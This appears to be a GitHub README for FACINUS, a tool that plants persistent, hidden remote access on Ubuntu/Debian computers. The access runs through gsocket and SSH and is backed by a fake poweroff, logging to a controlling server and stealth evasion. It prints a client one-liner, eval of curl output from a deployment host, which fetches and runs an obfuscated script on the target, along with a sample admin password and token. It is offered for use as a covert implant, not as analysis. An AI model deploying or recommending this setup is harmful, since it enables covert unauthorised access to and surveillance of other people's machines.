## FACINUS - set a 24/7 access on a Ubuntu/Debian PC you have physical access to with [gsocket](https://www.gsocket.io/) and other features

This script is setting up an Apache server on your Arch based linux distro and targets Ubuntu/Debian.

## Features
- **SSH**: Set up SSH server on target to quickly access from internal network.
- **WOL**: Check for wake-on-lan availability, to be able to wake any other pc's on network which ran the script.
- **24/7**: Fake a poweroff to keep the PC running 24/7.
- **Log**: Logs everything on your server.
- **gsocket**: Set up a gsocket service on target to access the server from anywhere.
- **Stealth**: Simple evading techniques to avoid detection.

## Installation
For now this script doesn't have checks for other distros than Arch based with pacman package manager. I'll add more checks later.
You just have to run the install script that will setup everything automatically for you.
```
sudo ./install
```

## Help
You can run ./install --help to see available options.
```
./install --help
FACINUS Installation Script
Usage: ./install [options]

Options:
  --no-root            Install without root privileges (limited functionality)
  --no-services        Don't install system services
  --no-wol             Don't configure Wake-on-LAN
  --no-fake-poweroff   Don't install fake poweroff feature
  --no-gsocket         Don't install gsocket for remote access
  --no-stealth         Don't apply stealth techniques
  --light-theme        Use light theme for web interface
  --server-ip IP       Specify server IP address
  --server-port PORT   Specify server port (default: 80)
  --server-root PATH   Specify server root directory
  --verbose            Show verbose output
  --help               Show this help message
```

## Web Interface
After running the script you'll see something like this:
```
./install
[sudo] password for elleoma: 
Obfuscated script created.
==============================================================
Deployment server setup complete!
==============================================================
Server URL: http://192.168.0.131/deployment
Admin Page: http://192.168.0.131/deployment/admin.php
Admin Password: 2cn2lguMIdx9
Client Setup Command: eval "$(curl -fsSL http://192.168.0.104/deployment/y)"
==============================================================
Secret Token for accessing logs: NTVEYJWTYAk5OolAAKYodaSjPWKaKb4X
==============================================================
```
After accessing url you'll see a simple commands to copy and paste on the target.
On the admin panel you can check the logs and the secrets for gsocket access.

<img src="https://github.com/elleoma/facinus/blob/beta/screenshots/deployment.png"/>
<img src="https://github.com/elleoma/facinus/blob/beta/screenshots/admin.png"/>

## TODO
- [ ] Do fake poweroff for all possible variants for Ubuntu/Debian with gnome.
- [x] Add checks for other distros
- [ ] Obfuscation, process hiding, etc.
- [ ] Ability to install common precompiled binaries on a target without root access.
- [x] Add options to the script (no root, no services, etc.)
- [x] Add a dark theme for the web interface
